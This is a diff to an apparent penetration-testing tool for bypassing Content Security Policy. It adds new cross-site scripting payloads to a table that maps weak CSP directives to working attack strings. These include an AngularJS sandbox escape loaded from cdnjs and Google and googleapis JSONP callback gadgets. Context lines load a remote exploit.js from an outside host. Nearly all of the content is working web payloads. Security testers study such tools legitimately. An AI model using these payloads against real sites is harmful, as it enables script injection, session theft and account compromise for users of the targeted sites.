@@ -22,7 +22,8 @@ vulnerable_CSP_conf = {
         {'value': ['unsafe-inline'], 'payload': f'<script>{general_payload}</script>'},
         {'value': ['unsafe-inline'], 'payload': f'<img src=# onerror={general_payload}>'},
         {'value': ['*'], 'payload': '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'},
-        {'value': ['data:'], 'payload': f'<script src="data:,{general_payload}"></script>'}
+        {'value': ['data:'], 'payload': f'<script src="data:,{general_payload}"></script>'},
+        {'value':['https://cdnjs.cloudflare.com', 'unsafe-eval'], 'payload':"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };%s;//');}} </div>" % general_payload}
     ],
     "default-src": [
         {'value': ['https://*.google.com'], 'payload': f'"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback={general_payload}"></script>'},
@@ -74,6 +75,7 @@ vulnerable_CSP_conf = {
         {'value': ['https://*.googleapis.com'], 'payload': '"><embed src=\'//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e){%s}//\' allowscriptaccess=always>' % general_payload},
         {'value': ['https://*.googleapis.com'], 'payload': f'"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>'},
         {'value': ['https://*.googleapis.com'], 'payload': f'ng-app"ng-csp ng-click=$event.view.{general_payload}><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>'},
+        {'value': ['https://*.googleapis.com'], 'payload': f'<script src=https://www.googleapis.com/customsearch/v1?callback={general_payload}'},
         {'value': ['unsafe-inline', '*'], 'payload':f"<script>script=document.createElement('script');script.src='//0xhorizon.eu/cspass/exploit.js';window.frames.document.head.appendChild(script);</script>"}
     ]
 }
@@ -224,7 +226,7 @@ class Form:
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')
+    parser = argparse.ArgumentParser(add_help=True, description='CSP Bypass tool')
 
     parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
     parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode")
